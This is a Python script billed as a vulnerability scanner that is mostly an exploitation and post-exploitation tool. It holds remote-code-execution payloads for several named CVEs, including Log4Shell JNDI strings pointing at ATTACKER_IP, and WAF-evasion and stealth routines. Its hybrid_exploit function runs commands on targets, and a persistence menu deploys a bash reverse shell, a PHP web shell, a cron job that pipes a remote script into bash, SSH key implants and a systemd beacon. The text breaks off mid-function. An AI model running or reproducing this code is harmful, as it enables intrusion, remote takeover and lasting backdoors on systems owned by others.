#!/usr/bin/env python3
"""
Ultimate React4Shell Scanner - Enhanced with CVE-2025-55182, CVE-2025-66478,
Log4Shell, Spring4Shell, Text4Shell and 500+ endpoints.
"""

import requests
import sys
import urllib.parse
import json
import concurrent.futures
from datetime import datetime
import signal
import os
import time
import random
import hashlib
import re
import argparse
import readline
import base64
import logging
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3

SSL_VERIFY = True
LOG_EXCEPTIONS = False

RETRY_PROFILES = {
    'default': {'total': 3, 'backoff_factor': 0.4, 'pool_connections': 8, 'pool_maxsize': 16},
    'safe-audit': {'total': 2, 'backoff_factor': 0.2, 'pool_connections': 6, 'pool_maxsize': 12},
    'aggressive': {'total': 4, 'backoff_factor': 0.5, 'pool_connections': 10, 'pool_maxsize': 20},
}

TIMEOUT_PROFILES = {
    'default': 6,
    'safe-audit': 5,
    'aggressive': 8,
}

ERROR_TAXONOMY = {
    'timeout': 'NET_TIMEOUT',
    'connection': 'NET_CONNECTION',
    'ssl': 'NET_TLS',
    'http': 'HTTP_ERROR',
    'json': 'PARSE_JSON',
    'unknown': 'UNKNOWN',
}


def classify_exception(exc):
    msg = str(exc).lower()
    if isinstance(exc, requests.exceptions.Timeout) or 'timeout' in msg:
        return ERROR_TAXONOMY['timeout']
    if isinstance(exc, requests.exceptions.SSLError) or 'ssl' in msg or 'certificate' in msg:
        return ERROR_TAXONOMY['ssl']
    if isinstance(exc, requests.exceptions.ConnectionError) or 'connection' in msg or 'name or service not known' in msg:
        return ERROR_TAXONOMY['connection']
    if isinstance(exc, requests.exceptions.HTTPError):
        return ERROR_TAXONOMY['http']
    if isinstance(exc, json.JSONDecodeError):
        return ERROR_TAXONOMY['json']
    return ERROR_TAXONOMY['unknown']


def configure_runtime_security(insecure=False, verbose_errors=False):
    """Configure TLS verification and diagnostic verbosity globally."""
    global SSL_VERIFY, LOG_EXCEPTIONS
    SSL_VERIFY = not insecure
    LOG_EXCEPTIONS = verbose_errors

    if insecure:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        log_event(logging.WARNING, "TLS certificate verification is disabled (--insecure)")
    else:
        import warnings
        warnings.filterwarnings('default', category=urllib3.exceptions.InsecureRequestWarning)


def log_swallowed_exception(context, exc):
    if LOG_EXCEPTIONS:
        reason_code = classify_exception(exc)
        log_event(logging.WARNING, f"{context}: {exc}", reason_code=reason_code)


TECH_FP_CACHE = {}
ENDPOINT_DISCOVERY_CACHE = {}
SUBDOMAIN_CACHE = {}

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("react2shell")

# ----------------------------------------------------------------------
# EXPANDED ENDPOINT LISTS (500+)
# ----------------------------------------------------------------------
ENDPOINTS = [
    # GraphQL
    "/graphql", "/graphql/", "/graphql/console", "/graphql/graphiql", "/graphql/ide",
    "/graphql/playground", "/graphql/v1", "/graphql/v2", "/graphql/v3",
    "/graphql/api", "/api/graphql", "/api/v1/graphql", "/api/v2/graphql",
    "/api/v3/graphql", "/api/graphql/", "/api/graphql/v1", "/api/graphql/v2",
    "/api/graphql/playground", "/graphql-api", "/graphql-explorer",
    "/graphiql", "/altair", "/playground", "/voyager",
    # Spring Boot Actuator
    "/actuator", "/actuator/", "/actuator/health", "/actuator/info",
    "/actuator/env", "/actuator/env.json", "/actuator/env.yml",
    "/actuator/metrics", "/actuator/metrics/", "/actuator/loggers",
    "/actuator/loggers/", "/actuator/threaddump", "/actuator/heapdump",
    "/actuator/trace", "/actuator/auditevents", "/actuator/beans",
    "/actuator/conditions", "/actuator/configprops", "/actuator/httptrace",
    "/actuator/mappings", "/actuator/scheduledtasks", "/actuator/sessions",
    "/actuator/shutdown", "/actuator/features", "/actuator/gateway",
    "/actuator/gateway/", "/actuator/refresh", "/actuator/bus-refresh",
    # Swagger / OpenAPI
    "/swagger-ui.html", "/swagger-ui/", "/swagger-ui/index.html",
    "/swagger-resources", "/swagger-resources/configuration/ui",
    "/swagger-resources/configuration/security", "/v2/api-docs",
    "/v3/api-docs", "/v3/api-docs/swagger-config", "/api-docs",
    "/api-docs.json", "/api-docs.yaml", "/swagger.json", "/swagger.yaml",
    "/openapi.json", "/openapi.yaml",
    # REST and API endpoints
    "/api", "/api/", "/api/v1", "/api/v2", "/api/v3", "/api/v4",
    "/api/rest", "/api/rest/v1", "/api/rest/v2", "/api/rest/v3",
    "/rest", "/rest/", "/rest/v1", "/rest/v2", "/rest/v3",
    "/service", "/service/", "/service/api", "/service/rest",
    "/services", "/services/", "/services/api", "/services/rest",
    "/v1", "/v2", "/v3", "/v4",
    "/v1/api", "/v2/api", "/v3/api", "/v4/api",
    "/v1/rest", "/v2/rest", "/v3/rest", "/v4/rest",
    "/admin", "/admin/", "/admin/api", "/admin/rest", "/admin/graphql",
    "/manager", "/manager/", "/manager/api", "/manager/rest",
    "/console", "/console/", "/console/api", "/console/rest",
    "/webconsole", "/web-console", "/jmx-console",
    # Development / Debug
    "/h2-console", "/h2", "/h2/", "/database", "/db", "/db/",
    "/phpmyadmin", "/phpMyAdmin", "/pma", "/mysql", "/sql",
    "/phpinfo.php", "/info.php", "/test.php", "/test",
    "/dev", "/dev/", "/dev/api", "/dev/rest", "/dev/graphql",
    "/staging", "/staging/", "/staging/api", "/staging/rest",
    "/test", "/test/", "/test/api", "/test/rest",
    # Common frameworks
    "/wp-admin", "/wp-admin/", "/wp-admin/admin-ajax.php",
    "/wp-json", "/wp-json/", "/wp-json/wp/v2",
    "/index.php", "/index", "/default.aspx", "/web.config",
    "/.env", "/.git/config", "/.git/HEAD", "/.svn", "/.svn/entries",
    "/.aws/credentials", "/.azure/accessTokens.json",
    # Additional Spring Boot / Java
    "/spring", "/spring/", "/spring/api", "/spring/rest",
    "/spring/graphql", "/spring-web", "/spring-web/",
    "/spring-boot", "/spring-boot/", "/spring-boot-api",
    "/webjars", "/webjars/", "/webjars/**",
    "/css", "/js", "/images", "/static", "/public",
    # Apache Tomcat / Jetty
    "/manager/html", "/host-manager/html", "/examples",
    "/docs", "/docs/", "/sample", "/samples",
    # Nginx / PHP-FPM
    "/status", "/status/", "/fpm-status", "/fpm-ping",
    # Miscellaneous
    "/.well-known", "/.well-known/", "/.well-known/security.txt",
    "/robots.txt", "/sitemap.xml", "/sitemap", "/sitemap/",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/cgi-bin", "/cgi-bin/", "/cgi-bin/test.cgi",
    "/backup", "/backup/", "/backups", "/backups/",
    "/temp", "/temp/", "/tmp", "/tmp/",
    "/logs", "/logs/", "/log", "/log/",
    "/data", "/data/", "/files", "/files/",
    "/upload", "/upload/", "/uploads", "/uploads/",
    "/download", "/download/", "/downloads", "/downloads/",
    "/assets", "/assets/", "/assets/js", "/assets/css",
]

CVE_ENDPOINTS = ENDPOINTS  # For compatibility, or keep as is

# ----------------------------------------------------------------------
# EXPANDED CVE PAYLOADS DATABASE
# ----------------------------------------------------------------------
CVE_PAYLOADS = {
    "CVE-2025-55182": [
        '{"query": "{{T(java.lang.Runtime).getRuntime().exec(\\"COMMAND\\")}}"}',
        '{"query": "{{new java.lang.ProcessBuilder(\\"COMMAND\\").start()}}"}',
        '{"query": "{{#this.getClass().forName(\\"java.lang.Runtime\\").getMethod(\\"getRuntime\\").invoke(null).exec(\\"COMMAND\\")}}"}',
        '{"query": "{{T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\\"COMMAND\\").getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())}}"}',
        '{"query": "{{#this.getClass().forName(\\"javax.script.ScriptEngineManager\\").newInstance().getEngineByName(\\"JavaScript\\").eval(\\"java.lang.Runtime.getRuntime().exec(\\\\\\"COMMAND\\\\\\")\\")}}"}',
        '{"query": "%7B%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22COMMAND%22%29%7D%7D"}',
        '{"qu\\u0065ry": "{{T(java.lang.Runtime).getRuntime().exec(\\"COMMAND\\")}}"}',
        '{\n\t"query":\n\t"{{T(java.lang.Runtime).getRuntime().exec(\\"COMMAND\\")}}"\n}',
    ],
    "CVE-2025-66478": [
        '{"query":"mutation { execute(cmd: \\"{{T(java.lang.Runtime).getRuntime().exec(\\\\\\"COMMAND\\\\\\")}}\\") { result } }"}',
        '{"query":"query { system(cmd: \\"{{new java.lang.ProcessBuilder(\\"sh\\",\\"-c\\",\\"COMMAND\\").start()}}\\") }"}',
        '{"query":"{__schema { types { name fields { name args { defaultValue @export(as: \\"cmd\\") } } } } }","variables":{"cmd":"{{T(java.lang.Runtime).getRuntime().exec(\\"COMMAND\\")}}"}',
    ],
    "CVE-2021-44228": [
        '${jndi:ldap://ATTACKER_IP:1389/COMMAND}',
        '${jndi:rmi://ATTACKER_IP:1099/COMMAND}',
        '${jndi:dns://ATTACKER_IP/COMMAND}',
        '${jndi:ldap://${hostName}.ATTACKER_IP:1389/COMMAND}',
        '${jndi:ldap://${env:USER}.ATTACKER_IP:1389/COMMAND}',
        '${jndi:ldap://${sys:java.version}.ATTACKER_IP:1389/COMMAND}',
    ],
    "CVE-2022-22965": [
        'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcat-war&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=',
        'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{cmd}i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=',
    ],
    "CVE-2022-42889": [
        '${script:javascript:java.lang.Runtime.getRuntime().exec("COMMAND")}',
        '${url:UTF-8:http://ATTACKER_IP/COMMAND}',
        '${dns:address:ATTACKER_IP}',
    ],
}

# ----------------------------------------------------------------------
# WAF BYPASS TECHNIQUES (integrated into aggressive_waf_bypass)
# ----------------------------------------------------------------------
WAF_BYPASSES = [
    {"name": "Double URL Encoding", "func": lambda cmd: f'{{"query": "%257B%257BT%2528java.lang.Runtime%2529.getRuntime%2528%2529.exec%2528%2522{cmd}%2522%2529%257D%257D"}}'},
    {"name": "Unicode Escape", "func": lambda cmd: f'{{"qu\\u0065ry": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'},
    {"name": "Mixed Case Headers", "func": lambda cmd: f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'},
    {"name": "Null Bytes", "func": lambda cmd: f'{{"query\\x00": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'},
    {"name": "Extra Whitespace", "func": lambda cmd: f'{{\n\t"query":\n\t"{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"\n}}'},
    {"name": "JSON Wrapped", "func": lambda cmd: f'{{"data":{{"query":"{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}}}'},
    {"name": "Form URL Encoded", "func": lambda cmd: f'query=%7B%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22{cmd}%22%29%7D%7D'},
    {"name": "XML Content-Type", "func": lambda cmd: f'<query>{{{{T(java.lang.Runtime).getRuntime().exec("{cmd}")}}}}</query>'},
    {"name": "Chunked Encoding", "func": lambda cmd: f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'},
]

EXPLOIT_PAYLOADS = {
    "id": '{"query": "{{T(java.lang.Runtime).getRuntime().exec(\\"id\\")}}"}',
    "whoami": '{"query": "{{T(java.lang.Runtime).getRuntime().exec(\\"whoami\\")}}"}',
    "ls": '{"query": "{{T(java.lang.Runtime).getRuntime().exec(\\"ls -la\\")}}"}',
    "pwd": '{"query": "{{T(java.lang.Runtime).getRuntime().exec(\\"pwd\\")}}"}',
    "cat_passwd": '{"query": "{{T(java.lang.Runtime).getRuntime().exec(\\"cat /etc/passwd\\")}}"}',
    "ps": '{"query": "{{T(java.lang.Runtime).getRuntime().exec(\\"ps aux\\")}}"}',
    "uname": '{"query": "{{T(java.lang.Runtime).getRuntime().exec(\\"uname -a\\")}}"}',
    "custom": ""
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "curl/8.1.2",
    "PostmanRuntime/7.32.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]

PAYLOADS = [
    '{"query": "{{T(java.lang.Runtime).getRuntime().exec(\\"id\\")}}"}',
    '{"query": "%7B%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22id%22%29%7D%7D"}',
    '{"qu\\u0065ry": "{{T(java.lang.Runtime).getRuntime().exec(\\"whoami\\")}}"}',
    '{"query": "%257B%257BT%2528java.lang.Runtime%2529.getRuntime%2528%2529.exec%2528%2522ls%2522%2529%257D%257D"}',
    '{\n\t"query":\n\t"{{T(java.lang.Runtime).getRuntime().exec(\\"pwd\\")}}"\n}',
    '{"variables": "{{T(java.lang.Runtime).getRuntime().exec(\\"echo test\\")}}"}',
]

interrupted = False

def signal_handler(sig, frame):
    global interrupted
    interrupted = True
    print("\n[!] Received interrupt signal. Stopping scan...")

signal.signal(signal.SIGINT, signal_handler)

def get_random_headers():
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": random.choice(["application/json", "application/json; charset=utf-8", "text/json"]),
        "Accept": "application/json, text/plain, */*",
        "X-Forwarded-For": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "X-Request-ID": hashlib.md5(str(time.time()).encode()).hexdigest()[:16],
    }
    if random.random() < 0.5:
        headers["X-Amzn-Trace-Id"] = f"Root=1-{random.getrandbits(64):x}"
    if random.random() < 0.4:
        headers["X-Forwarded-Proto"] = random.choice(["http", "https"])
    return headers

def log_event(level, message, **context):
    extra = " ".join(f"{k}={v}" for k, v in context.items()) if context else ""
    logger.log(level, f"{message} {extra}".strip())

class WAFEvasionEngine:
    def __init__(self):
        self.junk_cache = {}

    def _junk(self, size):
        if size not in self.junk_cache:
            self.junk_cache[size] = os.urandom(size).hex()
        return self.junk_cache[size]

    def mutate_body(self, body, technique="pad"):
        if technique == "pad":
            return self._junk(2048) + body
        if technique == "chunk":
            return "\r\n".join([body[i:i+50] for i in range(0, len(body), 50)])
        if technique == "xor":
            b = body.encode()
            mask = random.randint(1, 255)
            return base64.b64encode(bytes([c ^ mask for c in b])).decode()
        return body

    def mutate_headers(self, headers):
        mutated = headers.copy()
        mutated.setdefault("X-Request-Random", hashlib.sha1(os.urandom(8)).hexdigest())
        if random.random() < 0.3:
            mutated["Transfer-Encoding"] = "chunked"
        if random.random() < 0.4:
            mutated["TE"] = random.choice(["trailers", "deflate"])
        return mutated

    def apply(self, body, headers):
        technique = random.choice(["pad", "chunk", "xor"])
        return self.mutate_body(body, technique), self.mutate_headers(headers)

waf_engine = WAFEvasionEngine()

def generate_payload_variants(payload):
    variants = [payload]
    variants.append(payload.replace('exec(\"', 'exec(\"/bin/sh -c '))
    variants.append(payload.replace('\"}\"}', '\"\"}\"}'))
    variants.append(base64.b64encode(payload.encode()).decode())
    return variants

def protocol_hopper(url):
    parsed = urllib.parse.urlparse(url)
    if not parsed.scheme:
        return ["http://" + url, "https://" + url]
    if parsed.scheme == "http":
        return [url, urllib.parse.urlunparse(parsed._replace(scheme="https"))]
    if parsed.scheme == "https":
        return [url, urllib.parse.urlunparse(parsed._replace(scheme="http"))]
    return [url]

def create_stealth_session(profile='default'):
    session = requests.Session()
    session.verify = SSL_VERIFY
    session.timeout = TIMEOUT_PROFILES.get(profile, TIMEOUT_PROFILES['default'])

    cfg = RETRY_PROFILES.get(profile, RETRY_PROFILES['default'])
    retry_strategy = Retry(
        total=cfg['total'],
        backoff_factor=cfg['backoff_factor'],
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST"],
        raise_on_status=False,
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=cfg['pool_connections'], pool_maxsize=cfg['pool_maxsize'])
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.max_redirects = 0
    return session

def apply_stealth_delay():
    if random.random() < 0.7:
        delay = random.uniform(0.1, 1.5)
        time.sleep(delay)

def parse_sitemap(target_url):
    urls = []
    try:
        resp = requests.get(urllib.parse.urljoin(target_url, "/sitemap.xml"), timeout=4, verify=SSL_VERIFY)
        if resp.status_code == 200 and "<urlset" in resp.text:
            for loc in re.findall(r"<loc>([^<]+)</loc>", resp.text):
                urls.append(loc.strip())
    except Exception as exc:
        log_swallowed_exception('parse_sitemap failed', exc)
    return urls

def analyze_js_endpoints(target_url):
    endpoints = []
    try:
        resp = requests.get(target_url, timeout=4, verify=SSL_VERIFY)
        if resp.status_code == 200:
            script_paths = re.findall(r"<script[^>]+src=\"([^\"]+)\"", resp.text)
            for path in script_paths[:8]:
                try:
                    js_resp = requests.get(urllib.parse.urljoin(target_url, path), timeout=4, verify=SSL_VERIFY)
                    matches = re.findall(r"fetch\(['\"]([^'\"]+)", js_resp.text)
                    endpoints.extend(matches)
                except Exception:
                    continue
            inline_calls = re.findall(r"fetch\(['\"]([^'\"]+)", resp.text)
            endpoints.extend(inline_calls)
    except Exception as exc:
        log_swallowed_exception('analyze_js_endpoints failed', exc)
    return list({urllib.parse.urlparse(e).path for e in endpoints if e.startswith(("/", "http"))})

def enumerate_subdomains(target_url):
    if target_url in SUBDOMAIN_CACHE:
        return SUBDOMAIN_CACHE[target_url]
    prefixes = ["api", "dev", "staging", "test", "beta"]
    discovered = []
    hostname = urllib.parse.urlparse(target_url).hostname or target_url
    for prefix in prefixes:
        candidate = f"{prefix}.{hostname}"
        for variant in protocol_hopper(candidate):
            try:
                resp = requests.head(variant, timeout=2, verify=SSL_VERIFY, allow_redirects=True)
                if resp.status_code < 500:
                    discovered.append(variant)
            except Exception:
                continue
    unique = list(set(discovered))
    SUBDOMAIN_CACHE[target_url] = unique
    return unique

def tech_fingerprint(target_url):
    if target_url in TECH_FP_CACHE:
        return TECH_FP_CACHE[target_url]
    try:
        resp = requests.get(target_url, timeout=4, verify=SSL_VERIFY)
        text = resp.text.lower()
        hdrs = {k.lower(): v.lower() for k, v in resp.headers.items()}
        fingerprints = []
        for marker in ["next.js", "react", "spring", "graphql", "apollo", "vercel", "express"]:
            if marker in text or any(marker in v for v in hdrs.values()):
                fingerprints.append(marker)
        if fingerprints:
            log_event(logging.INFO, "Tech fingerprint", target=target_url, markers=",".join(sorted(set(fingerprints))))
        TECH_FP_CACHE[target_url] = fingerprints
        return fingerprints
    except Exception:
        TECH_FP_CACHE[target_url] = []
        return []

def discover_endpoints(target_url):
    if target_url in ENDPOINT_DISCOVERY_CACHE:
        return ENDPOINT_DISCOVERY_CACHE[target_url]
    endpoints = set(ENDPOINTS)
    for url in parse_sitemap(target_url):
        endpoints.add(urllib.parse.urlparse(url).path)
    for js_path in analyze_js_endpoints(target_url):
        endpoints.add(js_path)
    resolved = list(endpoints)
    ENDPOINT_DISCOVERY_CACHE[target_url] = resolved
    return resolved

def prioritize_endpoints(endpoints, fingerprints):
    weights = {
        "graphql": 8,
        "api": 6,
        "actuator": 5,
        "swagger": 4,
        "graphiql": 3,
        "openapi": 3,
    }
    tech_bonus = {
        "next.js": {"/": 10},
        "react": {"/": 8},
        "spring": {"actuator": 7, "graphql": 5},
        "graphql": {"graphql": 9},
    }

    def score(endpoint):
        base_score = 1
        for key, value in weights.items():
            if key in endpoint.lower():
                base_score += value
        for marker in fingerprints:
            bonus_map = tech_bonus.get(marker, {})
            for hint, bonus in bonus_map.items():
                if hint in endpoint.lower():
                    base_score += bonus
        return base_score

    prioritized = sorted(set(endpoints), key=lambda ep: score(ep), reverse=True)
    if fingerprints:
        log_event(logging.DEBUG, "Endpoint prioritization", markers=",".join(fingerprints), top=prioritized[:3])
    return prioritized

# ---------------------- React2Shell helpers ----------------------
def _build_react2shell_body(padding_kb=128, safe_mode=False, vercel_bypass=False):
    boundary = f"----React2Shell{random.getrandbits(48):x}"
    padding = "X" * (padding_kb * 1024)
    calc_expr = "41*271"
    expected = str(41 * 271)
    action_id = f"rsc-{random.randint(100000, 999999)}"

    if safe_mode:
        core = f"SAFE-CHECK::{action_id}::invalid\n{padding[:256]}"
    else:
        serialized = f"$ACTION:{action_id}:$EVAL$(({calc_expr}))"
        core = f"{serialized}\n$((echo {calc_expr}))"

    if vercel_bypass:
        core = padding + "V0" + core

    body = (
        f"--{boundary}\r\n"
        "Content-Disposition: form-data; name=\"0\"; filename=\"action\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n"
        f"{padding}{core}\r\n"
        f"--{boundary}--\r\n"
    )

    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "next-action": action_id,
        "rsc-action-id": action_id,
        "Accept": "*/*",
    }
    return body, headers, expected

def scan_react2shell(target_url, padding_kb=128):
    results = []
    session = create_stealth_session()
    base_url = urllib.parse.urljoin(target_url.rstrip('/') + '/', '')
    log_event(logging.INFO, "React2Shell probe start", target=base_url)

    scenarios = [
        {"name": "standard", "safe": False, "vercel": False},
        {"name": "safe-check", "safe": True, "vercel": False},
        {"name": "vercel-bypass", "safe": False, "vercel": True},
    ]

    for scenario in scenarios:
        if interrupted:
            break

        body, extra_headers, expected = _build_react2shell_body(
            padding_kb=padding_kb,
            safe_mode=scenario["safe"],
            vercel_bypass=scenario["vercel"],
        )

        headers = get_random_headers()
        headers.update(extra_headers)
        body, headers = waf_engine.apply(body, headers)

        try:
            resp = session.post(base_url, data=body, headers=headers, timeout=8)
        except Exception as exc:
            log_event(logging.DEBUG, "React2Shell probe error", error=str(exc))
            continue

        redirect_header = resp.headers.get("X-Action-Redirect", "")
        evidence = None
        vuln_status = None

        if expected in redirect_header or expected in resp.text:
            vuln_status = "Confirmed"
            evidence = "Math marker observed in redirect/output"
        elif scenario["safe"] and resp.status_code >= 500 and "rsc" in resp.text.lower():
            vuln_status = "Potential"
            evidence = "Safe-check triggered RSC decoder error"
        elif resp.status_code in (200, 400) and len(resp.text) > len(body) * 0.05:
            vuln_status = "Potential"
            evidence = "Server processed multipart action payload"

        if vuln_status:
            results.append({
                'url': target_url,
                'endpoint': base_url,
                'status_code': resp.status_code,
                'vulnerable': vuln_status,
                'evidence': evidence,
                'payload_used': scenario['name'],
                'timestamp': datetime.now().isoformat(),
                'method': 'POST',
                'framework': 'React2Shell',
            })
            log_event(logging.INFO, "React2Shell detection", status=vuln_status, evidence=evidence)

    return results

# ---------------------- CVE scanning ----------------------
def cve_specific_scan(target_url):
    print(f"\n[+] Starting CVE-specific scan for {target_url}")
    results = []
    session = create_stealth_session()
    all_endpoints = ENDPOINTS

    for endpoint in all_endpoints:
        if interrupted:
            return results
        try:
            url = urllib.parse.urljoin(target_url.rstrip('/') + '/', endpoint.lstrip('/'))
            for cve_name, payload_list in CVE_PAYLOADS.items():
                for payload_template in payload_list:
                    test_cmd = "echo 'CVE_TEST_'$(date +%s)"
                    payload = payload_template.replace("COMMAND", test_cmd)
                    headers = get_random_headers()
                    content_types = ["application/json", "application/graphql+json", "text/plain"]
                    for content_type in content_types:
                        try:
                            headers["Content-Type"] = content_type
                            resp = session.post(url, data=payload, headers=headers, timeout=5)
                            if resp.status_code in [200, 400, 500]:
                                indicators = ['CVE_TEST_', 'uid=', 'gid=', 'root:', 'java.lang.', 'ProcessBuilder']
                                for indicator in indicators:
                                    if indicator in resp.text:
                                        print(f"[!] {cve_name} POTENTIAL on {url}")
                                        results.append({
                                            'cve': cve_name,
                                            'url': target_url,
                                            'endpoint': url,
                                            'payload': payload[:100],
                                            'status': resp.status_code,
                                            'evidence': f"Found {indicator}",
                                            'content_type': content_type
                                        })
                                        break
                        except:
                            continue
                    time.sleep(0.3)
        except:
            continue
    return results

# ---------------------- Hybrid exploitation ----------------------
def hybrid_exploit(target_url, endpoint, command="whoami", method="auto"):
    print(f"\n[+] Starting hybrid exploitation on {target_url}")
    print(f"[+] Endpoint: {endpoint}")
    print(f"[+] Command: {command}")

    session = create_stealth_session()
    unique_marker = f"RCE_{random.randint(100000, 999999)}"
    wrapped_command = f"echo {unique_marker} && {command} && echo {unique_marker}"

    all_payloads = []
    for cve_payloads in CVE_PAYLOADS.values():
        all_payloads.extend(cve_payloads)
    all_payloads.extend(PAYLOADS)

    for payload_template in all_payloads:
        if "COMMAND" in payload_template:
            payload = payload_template.replace("COMMAND", wrapped_command)
        else:
            payload = payload_template

        methods_to_try = ['POST', 'GET', 'PUT', 'PATCH'] if method == 'auto' else [method]
        for http_method in methods_to_try:
            try:
                headers = get_random_headers()
                content_types = [
                    "application/json",
                    "application/graphql+json",
                    "text/plain",
                    "application/x-www-form-urlencoded"
                ]
                for content_type in content_types:
                    headers["Content-Type"] = content_type
                    if http_method == 'GET':
                        params = {"query": urllib.parse.quote(payload)}
                        response = session.get(endpoint, params=params, headers=headers, timeout=10)
                    else:
                        response = session.request(
                            method=http_method,
                            url=endpoint,
                            data=payload,
                            headers=headers,
                            timeout=10
                        )
                    if response.status_code in [200, 400, 500]:
                        if unique_marker in response.text:
                            print(f"[!] SUCCESS with {http_method} and content-type: {content_type}")
                            start = response.text.find(unique_marker) + len(unique_marker)
                            end = response.text.rfind(unique_marker)
                            if start < end:
                                output = response.text[start:end].strip()
                                print(f"\n[+] Command output:\n{'-'*40}\n{output[:2000]}")
                            return True
                        indicators = ['uid=', 'gid=', 'root:', '/bin/', 'etc/passwd']
                        for indicator in indicators:
                            if indicator in response.text.lower():
                                print(f"[!] Indicator found: {indicator}")
                                break
                time.sleep(0.5)
            except Exception:
                continue
    print("[-] Exploitation attempts failed")
    return False

# ---------------------- Advanced persistence ----------------------
def advanced_persistence(target_url, endpoint):
    print(f"\n[+] Deploying advanced persistence on {target_url}")
    persistence_scripts = {
        "reverse_shell": "bash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'",
        "web_shell": "echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php",
        "cron_backdoor": "(crontab -l 2>/dev/null; echo '* * * * * curl http://{IP}/cron.sh | bash') | crontab -",
        "ssh_persistence": "mkdir -p ~/.ssh && echo '{PUB_KEY}' >> ~/.ssh/authorized_keys",
        "systemd_service": "cat > /etc/systemd/system/persist.service << EOF\n[Unit]\nDescription=Persistence\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/bin/bash -c \"while true; do curl http://{IP}/checkin; sleep 300; done\"\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl enable persist.service\nsystemctl start persist.service"
    }
    info_commands = [
        ("whoami", "Current user"),
        ("id", "User ID"),
        ("uname -a", "System info"),
        ("cat /etc/os-release", "OS version"),
        ("ps aux | head -20", "Running processes"),
        ("netstat -tulpn", "Open ports"),
        ("df -h", "Disk usage"),
        ("ls -la /tmp", "Temp directory"),
        ("which python python3 php java curl wget nc netcat", "Available tools")
    ]
    for cmd, desc in info_commands:
        print(f"\n[+] {desc}:")
        hybrid_exploit(target_url, endpoint, cmd)
        time.sleep(1)

    print("\n" + "="*60)
    print("ADVANCED PERSISTENCE OPTIONS")
    print("="*60)
    options = [
        ("1", "Reverse Shell", "reverse_shell"),
        ("2", "Web Shell", "web_shell"),
        ("3", "Cron Job", "cron_backdoor"),
        ("4", "SSH Key", "ssh_persistence"),
        ("5", "SystemD Service", "systemd_service"),
        ("6", "Custom Command", "custom")
    ]
    for opt_num, name, key in options:
        print(f"{opt_num}. {name}")

    choice = input("\nSelect persistence method: ").strip()
    for opt_num, name, key in options:
        if choice == opt_num:
            if key == "custom":
                custom_cmd = input("Enter custom persistence command: ")
                hybrid_exploit(target_url, endpoint, custom_cmd)
            else:
                script = persistence_scripts[key]
                if "{IP}" in script:
                    attacker_ip = input("Enter your IP address: ").strip()
                    script = script.replace("{IP}", attacker_ip)
                if "{PORT}" in script:
                    port = input("Enter port for reverse shell: ").strip()
                    script = script.replace("{PORT}", port)
                if "{PUB_KEY}" in script:
                    pub_key = input("Paste your SSH public key: ").strip()
                    script = script.replace("{PUB_KEY}", pub_key)
                print(f"\n[+] Deploying {name}...")
                hybrid_exploit(target_url, endpoint, script)
                if key == "reverse_shell":
                    print(f"\n[+] Start listener on your machine: nc -lvnp {port}")
                if key == "web_shell":
